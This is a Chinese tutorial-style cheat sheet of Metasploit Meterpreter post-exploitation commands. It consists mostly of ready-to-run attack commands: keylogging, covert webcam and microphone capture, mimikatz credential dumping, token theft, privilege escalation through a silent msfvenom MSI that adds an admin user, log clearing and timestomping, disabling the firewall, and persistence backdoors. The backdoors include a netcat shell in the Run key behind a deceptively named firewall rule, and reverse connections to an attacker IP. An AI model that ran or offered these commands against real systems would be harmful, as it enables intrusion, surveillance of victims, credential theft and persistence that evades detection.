# 原创
：  【kali-漏洞利用】（3.3）后渗透之Meterpreter（上）：命令大全

# 【kali-漏洞利用】（3.3）后渗透之Meterpreter（上）：命令大全

**目录**

[一、简介](#%E4%B8%80%E3%80%81%E7%AE%80%E4%BB%8B)

[1.1、概述：](#1.1%E3%80%81%E6%A6%82%E8%BF%B0%EF%BC%9A)

[1.2、Meterpreter](#1.2%E3%80%81Meterpreter)

[1.3、优点：](#1.3%E3%80%81%E4%BC%98%E7%82%B9%EF%BC%9A)

[1.4、常用命令：](#1.4%E3%80%81%E5%B8%B8%E7%94%A8%E5%91%BD%E4%BB%A4%EF%BC%9A)

[二、使用](#%E4%BA%8C%E3%80%81%E4%BD%BF%E7%94%A8)

[2.1、进程迁移：](#2.1%E3%80%81%E8%BF%9B%E7%A8%8B%E8%BF%81%E7%A7%BB%EF%BC%9A)

[2.2、系统命令：](#2.2%E3%80%81%E7%B3%BB%E7%BB%9F%E5%91%BD%E4%BB%A4%EF%BC%9A)

[基础命令：](#%E5%9F%BA%E7%A1%80%E5%91%BD%E4%BB%A4%EF%BC%9A)

[cmd命令](#cmd%E5%91%BD%E4%BB%A4)

[webcam摄像头命令](#%E2%80%8B%E2%80%8B%E2%80%8B%E2%80%8B%E2%80%8B%E2%80%8B%E2%80%8Bwebcam%E6%91%84%E5%83%8F%E5%A4%B4%E5%91%BD%E4%BB%A4)

[uictl开关键盘/鼠标](#uictl%E5%BC%80%E5%85%B3%E9%94%AE%E7%9B%98%2F%E9%BC%A0%E6%A0%87)

[execute执行文件](#execute%E6%89%A7%E8%A1%8C%E6%96%87%E4%BB%B6)

[clearev清除日志](#clearev%E6%B8%85%E9%99%A4%E6%97%A5%E5%BF%97)

[2.3、文件系统命令](#2.3%E3%80%81%E6%96%87%E4%BB%B6%E7%B3%BB%E7%BB%9F%E5%91%BD%E4%BB%A4)

[基本文件系统命令](#%E5%9F%BA%E6%9C%AC%E6%96%87%E4%BB%B6%E7%B3%BB%E7%BB%9F%E5%91%BD%E4%BB%A4)

[timestomp伪造时间戳](#timestomp%E4%BC%AA%E9%80%A0%E6%97%B6%E9%97%B4%E6%88%B3)

[2.4、网络命令](#2.4%E3%80%81%E7%BD%91%E7%BB%9C%E5%91%BD%E4%BB%A4)

[基本网络命令](#%E5%9F%BA%E6%9C%AC%E7%BD%91%E7%BB%9C%E5%91%BD%E4%BB%A4)

[portfwd端口转发](#portfwd%E7%AB%AF%E5%8F%A3%E8%BD%AC%E5%8F%91)

[autoroute添加路由](#autoroute%E6%B7%BB%E5%8A%A0%E8%B7%AF%E7%94%B1)

[2.5、信息收集](#2.5%E3%80%81%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86)

[键盘记录](#%E9%94%AE%E7%9B%98%E8%AE%B0%E5%BD%95)

[sniffer抓包](#sniffer%E6%8A%93%E5%8C%85)

[窃取令牌](#%E7%AA%83%E5%8F%96%E4%BB%A4%E7%89%8C)

[网络摄像头](#%E7%BD%91%E7%BB%9C%E6%91%84%E5%83%8F%E5%A4%B4)

[截屏](#%E6%88%AA%E5%B1%8F)

[2.6、提权](#2.6%E3%80%81%E6%8F%90%E6%9D%83)

[getsystem提权](#getsystem%E6%8F%90%E6%9D%83)

[利用AlwaysInstallElevated提权](#%E5%88%A9%E7%94%A8AlwaysInstallElevated%E6%8F%90%E6%9D%83)

[2.7、窃取hash及密码](#2.7%E3%80%81%E7%AA%83%E5%8F%96hash%E5%8F%8A%E5%AF%86%E7%A0%81)

[mimikatz](#mimikatz)

[kiwi](#kiwi)

[2.8、注册表操作](#2.8%E3%80%81%E6%B3%A8%E5%86%8C%E8%A1%A8%E6%93%8D%E4%BD%9C)

[基本命令](#%E5%9F%BA%E6%9C%AC%E5%91%BD%E4%BB%A4)

[利用注册表添加nc后门](#%E5%88%A9%E7%94%A8%E6%B3%A8%E5%86%8C%E8%A1%A8%E6%B7%BB%E5%8A%A0nc%E5%90%8E%E9%97%A8)

[2.9、后门植入](#2.9%E3%80%81%E5%90%8E%E9%97%A8%E6%A4%8D%E5%85%A5)

[Persistence(通过启动项安装)](#Persistence%28%E9%80%9A%E8%BF%87%E5%90%AF%E5%8A%A8%E9%A1%B9%E5%AE%89%E8%A3%85%29)

[Metsvc(通过服务安装)](#Metsvc%28%E9%80%9A%E8%BF%87%E6%9C%8D%E5%8A%A1%E5%AE%89%E8%A3%85%29)

---


## 一、简介

> 
<h3>1.1、概述：</h3>
获取目标机的Meterpreter Shell后，就进入了Metasploit的后期渗透利用阶段，后期渗透模块有200多个
<hr/>
使用 metasploit 渗透完成后，需要进行后渗透拿下目标主机，再进行一系列获取敏感信息、利用这台机器为跳板机做其他主机的攻击等，主要使用的是 metasploit 中的 post 模块，也就是后渗透模块


> 
<h3>1.2、Meterpreter</h3>
Metasploit提供一个强大的后渗透工具——Meterpreter
是 Metasploit 框架中的一个扩展模块，作为后渗透阶段的攻击载荷使用，在后渗透阶段具有强大的攻击力，攻击载荷在溢出攻击成功以后给我们返回一个控制通道。使用它作为攻击载荷能够获得目标系统的一个 meterpreter shell链接
<hr/>
Meterpreter shell 作为渗透模块有很多有用的功能，包含信息收集、 提 权 、注册表操作、令牌操纵、哈希利用、后门植入。



> 
<h3>1.3、优点：</h3>
总：易于隐藏
<hr/>
不需要对磁盘进行任何写入操作，因此 HIDS（基于主机的入侵检测系统）很难对它做出响应
使用加密通信协议，而且可以同时与几个信道通信
在被攻击进程内工作，不需要创建新的进程
易于在多进程之间迁移
平台通用
简化任务创建多个会话，利用会话进行渗透
运行的时候系统时间是变化的，跟踪它、终止它非常困难


> 
<h3>1.4、常用命令：</h3>
help: 查看帮助信息
background：在后台Meterpreter会话
download: 从入侵主机上下载文件<br/> upload: 上传文件到入侵主机<br/> execute: 在入侵主机上执行命令<br/> shell: 在入侵主机上（仅Windows）运行Windows shell命令<br/> session -i: 切换会话


---


---


## 二、使用

> 
<h3>2.1、进程迁移：</h3>
刚获得Meterpreter Shell，Shell是极其脆弱的，要把Shell和目标机中稳定的进程绑定在一起
eg：利用浏览器漏洞攻陷目标机器，浏览器在一段时间后可能被用户关闭
<pre><code>ps   #查看当前活跃进程
getpid    #获取当前进程pid
migrate &lt;pid值&gt;    #将Meterpreter会话移植到指定pid值进程中
kill &lt;pid值&gt;   #杀死进程</code></pre>


> 
<h3>2.2、系统命令：</h3>
<h4>基础命令：</h4>
<pre><code>shell         #进入目标机cmd shell
background    #将当前会话放置后台
sessions      #sessions -h 查看帮助
sessions -i &lt;ID值&gt;  #进入会话   -k  杀死会话
bgrun / run   #执行已有的模块，输入run后按两下tab，列出已有的脚本
info      #查看已有模块信息
getuid    #查看当前用户身份
getprivs  #查看当前用户具备的权限
getpid    #获取当前进程ID(PID)
sysinfo   #查看目标机系统信息
irb   #开启ruby终端
ps    #查看正在运行的进程    
kill &lt;PID值&gt; #杀死指定PID进程
idletime     #查看目标机闲置时间
reboot / shutdown    #重启/关机

</code></pre>
<hr/>
<h4>cmd命令</h4>
<pre><code>whoami     #当前权限
quser      #当前在线的管理员
net user   #存在用户
net user 用户名 密码 /add            #添加用户和对应密码
net localgroup 用户组名 用户名 /add  #将指定用户添加到指定用户组
netstat -ano  #查询当前计算机中网络连接通信情况，LISTENING表示该端口处于监听状态；ESTABLISHED表示该端口处于工作（通信）状态
systeminfo     #查看当前计算机中的详细情况
tasklist /svc  #查看每个进程所对应的服务
taskkill /f /im 程序名称    #结束某个指定名称的程序
taskkill /f /PID ID        #结束某个指定PID的进程
tasklist | findstr "字符串" #查找输出结果中指定的内容
netsh adcfirewall set allprofiles state off  #关闭防火墙
logoff        #注销某个指定用户的ID
shutdown -r   #重启当前计算机
</code></pre>
<hr/>
<h4>​​​​​​​webcam摄像头命令</h4>
<pre><code>webcam_list     #查看摄像头
webcam_snap     #通过摄像头拍照
webcam_stream   #通过摄像头开启视频</code></pre>
<hr/>
<h4>uictl开关键盘/鼠标</h4>
<pre><code>uictl [enable/disable] [keyboard/mouse/all]  #开启或禁止键盘/鼠标
uictl disable mouse     #禁用鼠标
uictl disable keyboard  #禁用键盘
</code></pre>
<hr/>
<h4>execute执行文件</h4>
<pre><code>execute   #在目标机中执行文件
execute -H -i -f  cmd.exe   #创建新进程cmd.exe，-H不可见，-i交互
execute -H -m -d notepad.exe -f payload.exe -a "-o hack.txt"
  #-d 在目标主机执行时显示的进程名称（用以伪装）-m 直接从内存中执行
  #"-o hack.txt"是payload.exe的运行参数
</code></pre>
<hr/>
<h4>clearev清除日志</h4>
<pre><code>clearev    #清除windows中的应用程序日志、系统日志、安全日志
</code></pre>


#### cmd命令

---


#### uictl开关键盘/鼠标

---


#### clearev清除日志

> 
<h3>2.3、文件系统命令</h3>
<h4>基本文件系统命令</h4>
<pre><code>ls   #列出当前目录中的文件列表
cd   #进入指定目录
getwd / pwd              #查看当前工作目录  
search -d c:\\ -f *.txt  #搜索文件  -d 目录 -f 文件名
cat c:\\123.txt          #查看文件内容
upload /tmp/hack.txt C:\\   #上传文件到目标机上
download c:\\123.txt /tmp/  #下载文件到本机上
edit c:\\test.txt  #编辑或创建文件  没有的话，会新建文件
rm C:\\hack.txt    #删除文件
mkdir admin    #只能在当前目录下创建文件夹
rmdir admin    #只能删除当前目录下文件夹
getlwd / lpwd  #查看本地当前目录
lcd /tmp       #切换本地目录
</code></pre>
<hr/>
<h4>timestomp伪造时间戳</h4>
<pre><code>timestomp C:\\ -h        #查看帮助
timestomp -v C:\\2.txt   #查看时间戳
timestomp C:\\2.txt -f C:\\1.txt   #将1.txt的时间戳复制给2.txt
timestomp  c:\\test\\22.txt -z "03/10/2019 11:55:55" -v    #把四个属性设置为统一时间
</code></pre>


#### timestomp伪造时间戳

> 
<h3>2.4、网络命令</h3>
<h4>基本网络命令</h4>
<pre><code>ipconfig/ifconfig    #看网络接口信息
netstat –ano         #查看网络连接状态
arp         #查看arp缓冲表
getproxy    #查看代理信息
route       #查看路由表信息
</code></pre>
<hr/>
<h4>portfwd端口转发</h4>
<pre><code>portfwd add -l 1111 -p 3389 -r 127.0.0.1  #将目标机的3389端口转发到本地1111端口
rdesktop 127.0.0.1:1111                   #需要输入用户名密码连接
rdesktop -u Administrator -p 123 127.0.0.1:1111   #-u 用户名 -p 密码
</code></pre>
<hr/>
<h4>autoroute添加路由</h4>
<pre><code>run autoroute -h        #查看帮助
run get_local_subnets   #查看目标内网网段地址
run autoroute -s 192.168.183.0/24    #添加目标网段路由
run autoroute -p        #查看添加的路由
</code></pre>


#### portfwd端口转发

---


> 
<h3>2.5、信息收集</h3>
<h4>键盘记录</h4>
<pre><code>keyscan_start  #开始键盘记录
keyscan_dump   #导出记录数据
keyscan_stop   #结束键盘记录
</code></pre>
<hr/>
<h4>sniffer抓包</h4>
<pre><code>use sniffer
sniffer_interfaces  #查看网卡
sniffer_start 1     #选择网卡1开始抓包
sniffer_stats 1     #查看网卡1状态
sniffer_dump 1 /tmp/wlan1.pcap  #导出pcap数据包
sniffer_stop 1     #停止网卡1抓包
sniffer_release 1  #释放网卡1流量
</code></pre>
<hr/>
<h4>窃取令牌</h4>
<pre><code>steal_token &lt;pid值&gt;   #从指定进程中窃取token  
drop_token            #停止假冒当前的token
</code></pre>
<hr/>
<h4>网络摄像头</h4>
<pre><code>record_mic　   #音频录制
webcam_chat    #开启视频聊天(对方有弹窗）
webcam_list    #查看摄像头
webcam_snap    #通过摄像头拍照
webcam_stream  #通过摄像头开启视频监控(以网页形式进行监控≈直播）
</code></pre>
<hr/>
<h4>截屏</h4>
<pre><code>screenshot  #截屏
use espia   #使用espia模块
screengrab  #截屏
</code></pre>


#### sniffer抓包

---


#### 网络摄像头

---


> 
<h3>2.6、提权</h3>
<h4>getsystem提权</h4>
<pre><code>getuid      #查看已获得权限
getsystem   #提权
</code></pre>
<hr/>
<h4>利用AlwaysInstallElevated提权</h4>
AlwaysInstallElevated是一个策略设置
微软允许非授权用户以SYSTEM权限运行安装文件(MSI)
前提：用户启用此策略，就可利用恶意的MSI文件进行管理员权限的提升
<pre><code>查看AlwaysInstallElevated是否被定义
前提条件，需要有两个注册表的键值为1，在cmdshell下查看是否被定义
reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated

如果在组策略里未定义，则会出现“错误: 系统找不到指定的注册表项或值”的提示
</code></pre>
开启的方法：<br/> 1、打开组策略编辑器（运行框输入gpedit.msc）<br/> 2、组策略---计算机配置---管理模版---Windows组件---Windows Installer---永远以高特权进行安装：选择启用<br/> 3、组策略---用户配置---管理模版---Windows组件---Windows Installer---永远以高特权进行安装：选择启用
（设置完成后对应注册表值会设为1，即开启AlwaysInstallElevated）

<pre><code>生成MSI安装文件
（msf生成的msi文件，会被杀毒软件拦截，做好免杀）

利用msfvenom命令生成一个在目标机上增加管理员用户的MSI安装文件，密码设置为强密码，否则会报错
msfvenom -p windows/adduser USER=msi PASS=Abc123@@ -f msi -o msi.msi
</code></pre>
<pre><code>上传并执行MSI文件

upload msi.msi c:\\Users\\test # 部分目录由于权限原因可能上传失败
msiexec /quiet /qn /i msi.msi  # /quiet=安装过程中禁止向用户发送消息 /qn=不使用图形界面 /i=安装程序
net localgroup administrators

net localgroup administrators
（执行成功后查看管理员组发现用户已经添加成功）</code></pre>


#### 利用AlwaysInstallElevated提权

> 
<h3>2.7、窃取hash及密码</h3>
<h4>mimikatz</h4>
<pre><code>load mimikatz    #加载mimikatz模块
msv       #获取用户和hash值 
kerberos  #获取内存中的明文密码信息
wdigest   #获取内存中的明文密码信息
mimikatz_command -f a::    #需要以错误的模块来让正确的模块显示
mimikatz_command -f sekurlsa::searchPasswords  #获取用户密码
mimikatz_command -f samdump::hashes            #执行用户hash
</code></pre>
<hr/>
<h4>kiwi</h4>
kiwi是利用的mimikatz扩展，运行需要SYSTEM权限
<pre><code>load kiwi
creds_all</code></pre>



#### kiwi

> 
<h3>2.8、注册表操作</h3>
<h4>基本命令</h4>
<pre><code>reg –h    #查看帮助
-k 注册表的路径 -v 键的名称 -d 键值 
reg enumkey [-k &lt;key&gt;]    #枚举注册表的内容
reg createkey [-k &lt;key&gt;]  #创建注册表项
reg deletekey [-k &lt;key&gt;]  #删除注册表项
reg setval [-k &lt;key&gt; -v &lt;val&gt; -d &lt;data&gt;]  #在注册表里添加内容
reg deleteval [-k &lt;key&gt; -v &lt;val&gt;]         #删除注册表的值
reg queryval [-k &lt;key&gt; -v &lt;val&gt;]          #查询注册表的值

</code></pre>
<hr/>
<h4>利用注册表添加nc后门</h4>
后门程序：编辑注册表，添加nc到系统启动项中
<pre><code>upload /usr/share/windows-binaries/nc.exe C:\\windows\\system32 
    #上传nc到目标主机
reg enumkey -k HKLM\\software\\microsoft\\windows\\currentversion\\run   
    #枚举注册表run下的键值
reg setval -k HKLM\\software\\microsoft\\windows\\currentversion\\run -v test_nc -d 'C:\windows\system32\nc.exe -Ldp 443 -e cmd.exe' 
    #设置键值 -v 键的名称 -d 键值
reg queryval -k HKLM\\software\\microsoft\\windows\\currentversion\\Run -v test_nc   
    #查询test_nc的键值
</code></pre>
<hr/>
设置防火墙允许通过443端口
注：目标主机开启防火墙，但未设置相应的规则可能会导致连接失败
<pre><code>shell
netsh firewall show opmode 
    #查看防火墙状态
netsh firewall add portopening TCP 443 "网络发现(Pub PSD-Out)" ENABLE ALL 
    #添加防火墙的规则允许443端口通过(这里“网络发现(Pub PSD-Out)”是规则名称，目的是为了迷惑管理员。) 
</code></pre>
<pre><code>待目标主机重启后，自启nc程序，利用nc连接
nc ip port</code></pre>


#### 利用注册表添加nc后门

---


> 
<h3>2.9、后门植入</h3>
通过漏洞获取到目标主机权限之后，如果目标主机主机重启或修补了漏洞，就会失去对服务器的控制权
需要通过植入后门来维持权限，nc后门、Persistence、Metsvc
<h4>Persistence(通过启动项安装)</h4>
<pre><code>run persistence –h  #查看帮助
run persistence -X -i 5 -p 4444 -r 192.168.183.147 
run persistence -U -i 5 -p 4444 -r 192.168.183.147 -L c:\\Windows\\System32

-X：设置后门在系统启动后自启动。该方式会在HKLM\Software\Microsoft\Windows\CurrentVersion\Run下添加注册表信息。由于权限原因会导致添加失败，后门无法启动。因此在非管理员权限下，不推荐使用该参数
-U：设置后门在用户登录后自启动。该方式会在HKCU\Software\Microsoft\Windows\CurrentVersion\Run下添加注册表信息
-L：后门传到远程主机的位置默认为%TEMP%
-i：设置反向连接间隔时间为5秒
-p：设置反向连接的端口号
-r：设置反向连接的ip地址
</code></pre>
<hr/>
<h4>Metsvc(通过服务安装)</h4>
<pre><code>run metsvc -h   #查看帮助
run metsvc -A   #自动安装后门
run metsvc -r   #删除后门

连接后门
use exploit/multi/handler 
set payload windows/metsvc_bind_tcp
set rhost 192.168.183.169
set lport 31337
run
</code></pre>


#### Metsvc(通过服务安装)

（注：命令来自网络）
